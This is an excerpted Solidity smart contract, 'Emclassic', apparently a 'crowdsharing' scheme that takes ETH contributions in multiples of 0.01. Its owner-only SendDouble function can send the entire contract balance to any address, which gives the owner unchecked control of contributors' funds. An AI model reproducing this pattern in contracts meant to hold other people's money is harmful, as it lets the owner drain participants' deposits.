/**
* Designed and developed by TEchiedev
  * 
  * A big thank you to the entire development team for making this possible!
  * 
  * Emclassic is a simple and straightforward crowsdharing smart contract designed around:
  ...
  *
  * 
  * Website: www.Emclassic.Com
  * Telegram: https://t.me/em_classic
  *
  */
...
contract Emclassic {
    ...
    modifier isWithinLimits(uint256 _eth) {
        require(_eth >= 10000000000000000, "Minimum contribution amount is 0.01 ETH");
        _;
    }
    ...
    modifier isallowedValue(uint256 _eth) {
        require(_eth % 10000000000000000 == 0, "Amount should be in multiple of 0.01 ETH please");
        _;
    }
  ...
  function SendDouble(uint256 amount,address _receiver) onlyOwner payable public {
         require(amount <= getBalance());
          address(uint160(_receiver)).transfer(amount); 
     }
